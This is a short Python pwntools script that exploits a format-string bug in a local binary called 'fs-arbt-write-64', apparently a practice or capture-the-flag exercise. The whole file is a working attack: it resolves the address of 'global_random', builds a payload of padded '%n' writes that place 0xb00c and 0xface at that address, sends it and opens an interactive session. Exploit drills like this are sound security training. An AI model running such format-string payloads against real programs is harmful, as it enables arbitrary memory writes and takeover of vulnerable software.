#!/usr/bin/env python

from pwn import *

p = process('fs-arbt-write-64')

gr_addr = p.elf.symbols['global_random']

print(hex(gr_addr))

print(p.recv())

first = 0xb00c
second = 0xface - 0xb00c
buf = "%" + ("%05dx" % first) + "%9$n" + "%" + ("%05dx" % second) + "%10$nd" + p64(gr_addr) + p64(gr_addr+2)
print(buf)

p.sendline(buf)

data = p.recv()

print(repr(data))

p.interactive()
